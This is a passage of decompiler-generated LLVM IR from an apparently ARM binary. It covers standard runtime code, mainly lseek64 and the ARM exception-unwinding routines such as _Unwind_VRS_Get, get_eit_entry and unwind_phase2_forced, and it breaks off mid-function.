  %v0_18464 = load i32, i32* @r0, align 4
  store i32 %v0_18464, i32* %r4.global-to-local, align 4
  br i1 %v2_1845c, label %dec_label_pc_18488, label %dec_label_pc_1846c

dec_label_pc_1846c:                               ; preds = %entry
  %v1_18474 = add i32 %v0_18464, 260
  %v4_18478 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_18474)
  %v2_1847c = icmp eq i32 %v4_18478, 0
  br i1 %v2_1847c, label %dec_label_pc_1848c, label %dec_label_pc_18488

dec_label_pc_18488:                               ; preds = %dec_label_pc_1846c, %entry
  br label %dec_label_pc_1848c

dec_label_pc_1848c:                               ; preds = %dec_label_pc_1846c, %dec_label_pc_18488
  %storemerge = phi i32 [ 0, %dec_label_pc_18488 ], [ 1, %dec_label_pc_1846c ]
  %v1_18490 = load i32, i32* %r4.global-to-local, align 4
  %v2_18490 = add i32 %v1_18490, 256
  %v3_18490 = inttoptr i32 %v2_18490 to i32*
  store i32 %storemerge, i32* %v3_18490, align 4
  %v2_18494 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18494, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 3, 24, 4, 25 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1848c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_184e4, label %dec_label_pc_184c8

dec_label_pc_184c8:                               ; preds = %entry
  %v0_184cc = call i32 @__aeabi_read_tp()
  %v3_184d0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_184d0 = sext i16 %v3_184d0 to i32
  %v0_184d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_184d4 = sub i32 0, %v0_184d4
  store i32 %v1_184d4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_184dc = add i32 %v4_184d0, %v0_184cc
  %v4_184dc = inttoptr i32 %v3_184dc to i32*
  store i32 %v1_184d4, i32* %v4_184dc, align 4
  %v0_184ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_184ec

dec_label_pc_184e4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_184e4 = icmp eq i32 %arg1, 0
  br i1 %v2_184e4, label %dec_label_pc_184f8, label %dec_label_pc_184ec

dec_label_pc_184ec:                               ; preds = %dec_label_pc_184e4, %dec_label_pc_184c8
  %v0_184ec = phi i32 [ %arg1, %dec_label_pc_184e4 ], [ %v0_184ec.pre, %dec_label_pc_184c8 ]
  %v3_184f0 = ashr i32 %v0_184ec, 31
  br label %dec_label_pc_184fc

dec_label_pc_184f8:                               ; preds = %dec_label_pc_184e4
  br label %dec_label_pc_184fc

dec_label_pc_184fc:                               ; preds = %dec_label_pc_184ec, %dec_label_pc_184f8
  %v1_18504 = phi i32 [ %v0_184ec, %dec_label_pc_184ec ], [ %tmp8, %dec_label_pc_184f8 ]
  %storemerge = phi i32 [ %v3_184f0, %dec_label_pc_184ec ], [ %tmp, %dec_label_pc_184f8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_18504

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32 31, { 8, 6, 7, 0, 4, 1, 2, 3, 9, 10, 5 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_2222c.358, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 16, 71, 70, 65, 64, 80, 79, 68, 69, 67, 66, 78, 77, 76, 75, 74, 73, 72, 19, 27, 29, 35, 63, 44, 43, 12, 6, 5, 11, 26, 25, 10, 3, 2, 13, 9, 8, 7, 49, 15, 24, 48, 47, 28, 21, 23, 22, 60, 59, 32, 31, 30, 33, 34, 58, 46, 57, 56, 18, 17, 55, 20, 62, 61, 42, 39, 38, 37, 45, 4, 54, 53, 36, 52, 14, 51, 50, 0, 1, 41, 40 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_184fc, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1850c = icmp eq i32 %regclass, 0
  br i1 %v2_1850c, label %dec_label_pc_18514, label %dec_label_pc_18544

dec_label_pc_18514:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18514
  %v6_18518 = icmp eq i32 %representation, 0
  br i1 %v6_18518, label %dec_label_pc_18528, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18514
  br label %dec_label_pc_18550

bb8:                                              ; preds = %bb
  br label %dec_label_pc_18550

dec_label_pc_18528:                               ; preds = %bb
  %v3_18528 = mul i32 %regno, 4
  %v2_1852c = add i32 %v3_18528, %context
  %v1_18530 = add i32 %v2_1852c, 4
  %v2_18530 = inttoptr i32 %v1_18530 to i32*
  %v3_18530 = load i32, i32* %v2_18530, align 4
  %v2_1853c = bitcast i8* %valuep to i32*
  store i32 %v3_18530, i32* %v2_1853c, align 4
  ret i32 0

dec_label_pc_18544:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_18544
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18544, %bb9
  %v0_1854c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_1854c)
  br label %dec_label_pc_18550

dec_label_pc_18550:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_18550, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_18558 = icmp eq i32 %regclass, 0
  br i1 %v2_18558, label %dec_label_pc_18560, label %dec_label_pc_18590

dec_label_pc_18560:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18560
  %v6_18564 = icmp eq i32 %representation, 0
  br i1 %v6_18564, label %dec_label_pc_18574, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18560
  br label %dec_label_pc_1859c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1859c

dec_label_pc_18574:                               ; preds = %bb
  %v3_18578 = mul i32 %regno, 4
  %v1_1857c = bitcast i8* %valuep to i32*
  %v2_1857c = load i32, i32* %v1_1857c, align 4
  %v2_18580 = add i32 %v3_18578, %context
  %v2_18588 = add i32 %v2_18580, 4
  %v3_18588 = inttoptr i32 %v2_18588 to i32*
  store i32 %v2_1857c, i32* %v3_18588, align 4
  ret i32 0

dec_label_pc_18590:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_18590
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18590, %bb9
  %v0_18598 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_18598)
  br label %dec_label_pc_1859c

dec_label_pc_1859c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1859c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_185a4 = add i32 %context, 68
  %v2_185a4 = inttoptr i32 %v1_185a4 to i32*
  %v3_185a4 = load i32, i32* %v2_185a4, align 4
  ret i32 %v3_185a4

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_185b4 = add i32 %exc, 8
  %v2_185b4 = inttoptr i32 %v1_185b4 to i32*
  %v3_185b4 = load i32, i32* %v2_185b4, align 4
  %v2_185b8 = icmp eq i32 %v3_185b4, 0
  br i1 %v2_185b8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_185cc = xor i1 %v2_185b8, true
  call void @__pseudo_cond_branch(i1 %v2_185cc, i32 %v3_185b4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_185e4 = call i32 @abort()
  ret i32 %v0_185e4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_185f0 = call i32 @abort()
  ret i32 %v0_185f0
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_185f4 = load i32, i32* @r4, align 4
  store i32 %v3_185f4, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r5.global-to-local, align 4
  %v4_18604 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 132) to i32*), align 4
  %v2_18608 = icmp eq i32 %v4_18604, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_18614 = add i32 %return_address, -2
  store i32 %v1_18614, i32* %r4.global-to-local, align 4
  br i1 %v2_18608, label %dec_label_pc_1864c, label %dec_label_pc_1861c

dec_label_pc_1861c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_18604)
  %v2_1862c = icmp eq i32 %v1_18614, 0
  br i1 %v2_1862c, label %.thread, label %dec_label_pc_1866cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_1861c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_18634 = load i32, i32* %r6.global-to-local, align 4
  %v3_18634 = add i32 %v2_18634, 16
  %v4_18634 = inttoptr i32 %v3_18634 to i32*
  store i32 0, i32* %v4_18634, align 4
  br label %dec_label_pc_1863c

dec_label_pc_1863c:                               ; preds = %.thread, %.thread10, %dec_label_pc_187e4, %dec_label_pc_187d0, %dec_label_pc_187ac, %dec_label_pc_18784, %dec_label_pc_18684
  %v0_1863c = load i32, i32* %r2.global-to-local, align 4
  %v2_18644 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_18644, i32* @r4, align 4
  ret i32 %v0_1863c

dec_label_pc_1864c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_18654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 20) to i32*), align 4
  %v4_18658 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 48) to i32*), align 4
  store i32 %v4_18658, i32* %r2.global-to-local, align 4
  %v2_1865c = sub i32 %v4_18654, %v4_18658
  %v3_18660 = sdiv i32 %v2_1865c, 8
  store i32 %v3_18660, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1866c

dec_label_pc_1866cthread-pre-split:               ; preds = %dec_label_pc_1861c
  %v3_1866c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1866c

dec_label_pc_1866c:                               ; preds = %dec_label_pc_1866cthread-pre-split, %dec_label_pc_1864c
  %v0_186b0.pre = phi i32 [ %v1_18614, %dec_label_pc_1866cthread-pre-split ], [ %v4_18658, %dec_label_pc_1864c ]
  %v1_18674 = phi i32 [ %v3_1866c.pr, %dec_label_pc_1866cthread-pre-split ], [ %v3_18660, %dec_label_pc_1864c ]
  %v2_18670 = icmp eq i32 %v1_18674, 0
  br i1 %v2_18670, label %dec_label_pc_18684, label %dec_label_pc_186a0.preheader

dec_label_pc_186a0.preheader:                     ; preds = %dec_label_pc_1866c
  %v2_18674 = add i32 %v1_18674, -1
  %v1_186d0 = add i32 %v0_186b0.pre, 8
  br label %dec_label_pc_186a0.outer

dec_label_pc_18684.loopexit:                      ; preds = %dec_label_pc_186fc
  br label %dec_label_pc_18684

dec_label_pc_18684:                               ; preds = %dec_label_pc_18684.loopexit, %dec_label_pc_1866c, %dec_label_pc_187c8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1868c = load i32, i32* %r6.global-to-local, align 4
  %v2_1868c = add i32 %v1_1868c, 16
  %v3_1868c = inttoptr i32 %v2_1868c to i32*
  store i32 0, i32* %v3_1868c, align 4
  br label %dec_label_pc_1863c

dec_label_pc_18694:                               ; preds = %dec_label_pc_186f0
  %v3_18694 = icmp ult i32 %storemerge40, %v0_186f4
  br i1 %v3_18694, label %dec_label_pc_1869c, label %dec_label_pc_1870c

dec_label_pc_1869c:                               ; preds = %dec_label_pc_18694
  %v1_1869c = add nsw i32 %v3_186a8, 1
  br label %dec_label_pc_186a0.outer

dec_label_pc_186a0.outer:                         ; preds = %dec_label_pc_1869c, %dec_label_pc_186a0.preheader
  %v1_186fc.ph = phi i32 [ %v1_1869c, %dec_label_pc_1869c ], [ 0, %dec_label_pc_186a0.preheader ]
  %v0_186a0.ph = phi i32 [ %v0_186a0, %dec_label_pc_1869c ], [ %v2_18674, %dec_label_pc_186a0.preheader ]
  br label %dec_label_pc_186a0

dec_label_pc_186a0:                               ; preds = %dec_label_pc_186a0.outer, %dec_label_pc_18704
  %v0_186a0 = phi i32 [ %v1_18704, %dec_label_pc_18704 ], [ %v0_186a0.ph, %dec_label_pc_186a0.outer ]
  %v2_186a0 = add i32 %v0_186a0, %v1_186fc.ph
  %tmp = icmp slt i32 %v2_186a0, 0
  %v4_186a4 = zext i1 %tmp to i32
  %v5_186a4 = add i32 %v4_186a4, %v2_186a0
  %v3_186a8 = sdiv i32 %v5_186a4, 2
  %v3_186ac = mul i32 %v3_186a8, 8
  store i32 %v3_186ac, i32* @ip, align 4
  %v2_186b0 = add i32 %v3_186ac, %v0_186b0.pre
  %v3_186b0 = inttoptr i32 %v2_186b0 to i32*
  %v4_186b0 = load i32, i32* %v3_186b0, align 4
  %v1_186b4 = and i32 %v4_186b0, 1073741824
  %v2_186b4 = icmp eq i32 %v1_186b4, 0
  %v2_186b8 = or i32 %v4_186b0, -2147483648
  %tmp79 = bitcast i32 %v4_186b0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_186bc = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_186b4, i32 %v2_186bc, i32 %v2_186b8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_186c0 = icmp eq i32 %v2_18674, %v3_186a8
  store i32 %v2_186b0, i32* %r7.global-to-local, align 4
  br i1 %v9_186c0, label %dec_label_pc_186f0, label %dec_label_pc_186d0

dec_label_pc_186d0:                               ; preds = %dec_label_pc_186a0
  %v2_186d4 = add i32 %v3_186ac, %v1_186d0
  %v3_186d4 = inttoptr i32 %v2_186d4 to i32*
  %v4_186d4 = load i32, i32* %v3_186d4, align 4
  %v1_186dc = and i32 %v4_186d4, 1073741824
  %v2_186dc = icmp eq i32 %v1_186dc, 0
  %v2_186e0 = or i32 %v4_186d4, -2147483648
  %tmp81 = bitcast i32 %v4_186d4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_186e4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_186dc, i32 %v2_186e4, i32 %v2_186e0
  %v1_186e8 = add i32 %v2_186d4, -1
  %v2_186ec = add i32 %storemerge39, %v1_186e8
  br label %dec_label_pc_186f0

dec_label_pc_186f0:                               ; preds = %dec_label_pc_186a0, %dec_label_pc_186d0
  %storemerge40 = phi i32 [ %v2_186ec, %dec_label_pc_186d0 ], [ -1, %dec_label_pc_186a0 ]
  %v2_186f0 = add i32 %storemerge, %v2_186b0
  %v0_186f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_186f4 = icmp ult i32 %v0_186f4, %v2_186f0
  br i1 %v3_186f4, label %dec_label_pc_186fc, label %dec_label_pc_18694

dec_label_pc_186fc:                               ; preds = %dec_label_pc_186f0
  %v9_186fc = icmp eq i32 %v3_186a8, %v1_186fc.ph
  br i1 %v9_186fc, label %dec_label_pc_18684.loopexit, label %dec_label_pc_18704

dec_label_pc_18704:                               ; preds = %dec_label_pc_186fc
  %v1_18704 = add nsw i32 %v3_186a8, -1
  br label %dec_label_pc_186a0

dec_label_pc_1870c:                               ; preds = %dec_label_pc_18694
  %v2_1870c = load i32, i32* %v3_186b0, align 4
  %v1_18710 = and i32 %v2_1870c, 1073741824
  %v2_18710 = icmp eq i32 %v1_18710, 0
  %v2_18714 = or i32 %v2_1870c, -2147483648
  %tmp83 = bitcast i32 %v2_1870c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_18718 = bitcast float %tmp84 to i32
  %v0_1871c = select i1 %v2_18710, i32 %v2_18718, i32 %v2_18714
  %v2_1871c = add i32 %v0_1871c, %v2_186b0
  %v1_18720 = load i32, i32* %r6.global-to-local, align 4
  %v2_18720 = add i32 %v1_18720, 72
  %v3_18720 = inttoptr i32 %v2_18720 to i32*
  store i32 %v2_1871c, i32* %v3_18720, align 4
  %v0_18724 = load i32, i32* %r7.global-to-local, align 4
  %v1_18724 = add i32 %v0_18724, 4
  %v2_18724 = inttoptr i32 %v1_18724 to i32*
  %v3_18724 = load i32, i32* %v2_18724, align 4
  %v7_18728 = icmp eq i32 %v3_18724, 1
  br i1 %v7_18728, label %.thread10, label %dec_label_pc_1873c

.thread10:                                        ; preds = %dec_label_pc_1870c
  %v1_18728 = add i32 %v3_18724, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_18734 = load i32, i32* %r6.global-to-local, align 4
  %v3_18734 = add i32 %v2_18734, 16
  %v4_18734 = inttoptr i32 %v3_18734 to i32*
  store i32 %v1_18728, i32* %v4_18734, align 4
  br label %dec_label_pc_1863c

dec_label_pc_1873c:                               ; preds = %dec_label_pc_1870c
  %v1_1873c = icmp slt i32 %v3_18724, 0
  br i1 %v1_1873c, label %.thread38, label %dec_label_pc_18754

.thread38:                                        ; preds = %dec_label_pc_1873c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_18748 = load i32, i32* %r6.global-to-local, align 4
  %v5_18748 = add i32 %v4_18748, 76
  %v6_18748 = inttoptr i32 %v5_18748 to i32*
  store i32 %v1_18724, i32* %v6_18748, align 4
  %v3_1874c = load i32, i32* %r2.global-to-local, align 4
  %v4_1874c = load i32, i32* %r6.global-to-local, align 4
  %v5_1874c = add i32 %v4_1874c, 80
  %v6_1874c = inttoptr i32 %v5_1874c to i32*
  store i32 %v3_1874c, i32* %v6_1874c, align 4
  br label %dec_label_pc_18774

dec_label_pc_18754:                               ; preds = %dec_label_pc_1873c
  %v1_18754 = and i32 %v3_18724, 1073741824
  %v2_18754 = icmp eq i32 %v1_18754, 0
  %v2_18758 = or i32 %v3_18724, -2147483648
  %tmp85 = bitcast i32 %v3_18724 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_1875c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_18754, i32 %v2_1875c, i32 %v2_18758
  %v1_18760 = add i32 %storemerge42, 4
  %v2_18764 = add i32 %v1_18760, %v0_18724
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1876c = load i32, i32* %r6.global-to-local, align 4
  %v2_1876c = add i32 %v1_1876c, 76
  %v3_1876c = inttoptr i32 %v2_1876c to i32*
  store i32 %v2_18764, i32* %v3_1876c, align 4
  %v0_18770 = load i32, i32* %r2.global-to-local, align 4
  %v1_18770 = load i32, i32* %r6.global-to-local, align 4
  %v2_18770 = add i32 %v1_18770, 80
  %v3_18770 = inttoptr i32 %v2_18770 to i32*
  store i32 %v0_18770, i32* %v3_18770, align 4
  br label %dec_label_pc_18774

dec_label_pc_18774:                               ; preds = %.thread38, %dec_label_pc_18754
  %v0_18774 = load i32, i32* %r6.global-to-local, align 4
  %v1_18774 = add i32 %v0_18774, 76
  %v2_18774 = inttoptr i32 %v1_18774 to i32*
  %v3_18774 = load i32, i32* %v2_18774, align 4
  store i32 %v3_18774, i32* %r2.global-to-local, align 4
  %v1_18778 = inttoptr i32 %v3_18774 to i32*
  %v2_18778 = load i32, i32* %v1_18778, align 4
  %v1_1877c = icmp slt i32 %v2_18778, 0
  br i1 %v1_1877c, label %dec_label_pc_187a0, label %dec_label_pc_18784

dec_label_pc_18784:                               ; preds = %dec_label_pc_18774
  %v1_18784 = and i32 %v2_18778, 1073741824
  %v2_18784 = icmp eq i32 %v1_18784, 0
  %v2_18788 = or i32 %v2_18778, -2147483648
  %tmp87 = bitcast i32 %v2_18778 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1878c = bitcast float %tmp88 to i32
  %v0_18790 = select i1 %v2_18784, i32 %v2_1878c, i32 %v2_18788
  %v2_18790 = add i32 %v0_18790, %v3_18774
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_18798 = add i32 %v0_18774, 16
  %v3_18798 = inttoptr i32 %v2_18798 to i32*
  store i32 %v2_18790, i32* %v3_18798, align 4
  br label %dec_label_pc_1863c

dec_label_pc_187a0:                               ; preds = %dec_label_pc_18774
  %v3_187a0 = udiv i32 %v2_18778, 16777216
  %v1_187a4 = urem i32 %v3_187a0, 16
  %v2_187a4 = icmp eq i32 %v1_187a4, 0
  br i1 %v2_187a4, label %dec_label_pc_187ac, label %dec_label_pc_187c0

dec_label_pc_187ac:                               ; preds = %dec_label_pc_187a0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_187b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_187b4 = add i32 %v0_187b4, -36884
  %v2_187b8 = add i32 %v0_18774, 16
  %v3_187b8 = inttoptr i32 %v2_187b8 to i32*
  store i32 %v2_187b4, i32* %v3_187b8, align 4
  br label %dec_label_pc_1863c

dec_label_pc_187c0:                               ; preds = %dec_label_pc_187a0
  %v7_187c0 = icmp eq i32 %v1_187a4, 1
  br i1 %v7_187c0, label %dec_label_pc_187e4, label %dec_label_pc_187c8

dec_label_pc_187c8:                               ; preds = %dec_label_pc_187c0
  %v7_187c8 = icmp eq i32 %v1_187a4, 2
  br i1 %v7_187c8, label %dec_label_pc_187d0, label %dec_label_pc_18684

dec_label_pc_187d0:                               ; preds = %dec_label_pc_187c8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_187d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_187d8 = add i32 %v0_187d8, -36900
  %v2_187dc = add i32 %v0_18774, 16
  %v3_187dc = inttoptr i32 %v2_187dc to i32*
  store i32 %v2_187d8, i32* %v3_187dc, align 4
  br label %dec_label_pc_1863c

dec_label_pc_187e4:                               ; preds = %dec_label_pc_187c0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_187ec = load i32, i32* %r5.global-to-local, align 4
  %v2_187ec = add i32 %v0_187ec, -36892
  %v2_187f0 = add i32 %v0_18774, 16
  %v3_187f0 = inttoptr i32 %v2_187f0 to i32*
  store i32 %v2_187ec, i32* %v3_187f0, align 4
  br label %dec_label_pc_1863c

; uselistorder directives
  uselistorder i32 %v1_187a4, { 2, 1, 0 }
  uselistorder i32 %v0_18774, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_18724, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_186f4, { 1, 0 }
  uselistorder i32 %v3_186ac, { 2, 1, 0 }
  uselistorder i32 %v3_186a8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_186a0, { 1, 0 }
  uselistorder i32 %v0_186a0, { 1, 0 }
  uselistorder i32 %v2_18674, { 1, 0 }
  uselistorder i32 %v0_186b0.pre, { 1, 0 }
  uselistorder i32 %v3_18660, { 1, 0 }
  uselistorder i32 %v1_18614, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_18774, { 1, 0 }
  uselistorder label %dec_label_pc_186f0, { 1, 0 }
  uselistorder label %dec_label_pc_186a0, { 1, 0 }
  uselistorder label %dec_label_pc_18684, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1863c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_187fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_187fc:
  %v0_187fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_187fc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_187fc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_187fc, %bb
  %v10_18804 = phi i32 [ %arg1, %dec_label_pc_187fc ], [ 0, %bb ]
  ret i32 %v10_18804

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18818 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1882c = inttoptr i32 %v1_18818 to i32*
  %v2_1882c = load i32, i32* %v1_1882c, align 4
  store i32 %v2_1882c, i32* %r0.global-to-local, align 4
  %v12_1882c = add i32 %entry_vrs, 20
  %v1_18838 = inttoptr i32 %v12_1882c to i32*
  %v2_18838 = load i32, i32* %v1_18838, align 4
  store i32 %v2_18838, i32* %r0.global-to-local, align 4
  %v12_18838 = add i32 %entry_vrs, 36
  %v1_18840 = inttoptr i32 %v12_18838 to i32*
  %v2_18840 = load i32, i32* %v1_18840, align 4
  store i32 %v2_18840, i32* %r0.global-to-local, align 4
  %v12_18840 = add i32 %entry_vrs, 52
  store i32 %v12_18840, i32* @ip, align 4
  %v13_18844 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_18844, i32* @lr, align 4
  %v1_18848 = inttoptr i32 %v12_18840 to i32*
  %v2_18848 = load i32, i32* %v1_18848, align 4
  store i32 %v2_18848, i32* %r0.global-to-local, align 4
  %v9_18848 = add i32 %entry_vrs, 64
  %v10_18848 = inttoptr i32 %v9_18848 to i32*
  %v11_18848 = load i32, i32* %v10_18848, align 4
  store i32 0, i32* @r4, align 4
  %v1_18850 = add i32 %ucbp, 12
  %v2_18850 = inttoptr i32 %v1_18850 to i32*
  %v3_18850 = load i32, i32* %v2_18850, align 4
  store i32 %v2_18848, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_18868 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18848)
  store i32 %v2_18868, i32* %r0.global-to-local, align 4
  %v0_1886c = load i32, i32* @r6, align 4
  %v1_1886c = load i32, i32* @r4, align 4
  %v9_1886c = icmp eq i32 %v0_1886c, %v1_1886c
  store i32 %v2_18868, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1886c, label %dec_label_pc_18880, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1888c

dec_label_pc_18880:                               ; preds = %entry
  store i32 %v0_1886c, i32* @r4, align 4
  br label %dec_label_pc_18888

dec_label_pc_18888:                               ; preds = %dec_label_pc_18950, %dec_label_pc_18880
  br label %dec_label_pc_1888c

dec_label_pc_1888c:                               ; preds = %.thread, %dec_label_pc_18888
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_18888 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1888c = icmp eq i32 %v2_18868, 0
  br i1 %v2_1888c, label %dec_label_pc_18904, label %.thread2.dec_label_pc_188a0_crit_edge

